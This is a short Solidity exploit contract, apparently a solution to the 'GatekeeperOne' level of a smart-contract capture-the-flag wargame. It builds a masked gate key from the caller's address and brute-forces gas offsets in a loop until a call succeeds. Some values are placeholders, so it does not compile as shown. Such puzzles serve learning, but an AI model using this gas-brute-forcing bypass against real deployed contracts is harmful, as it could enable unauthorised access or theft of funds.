contract Attack{
    GatekeeperOne level13 = GatekeeperOne(address);
    
    function exploit() external{
        bytes8 _gateKey = bytes8(uint64(uint160(your address))) & 0xFFFFFFFF0000FFFF;
        for (uint256 i = 0; i < 300; i++) {
            (bool success, ) = address(level13).call{gas: i + (8191 * 3)}(abi.encodeWithSignature("enter(bytes8)", _gateKey));
            if (success) {
                break;
            }
        }
    } 
}
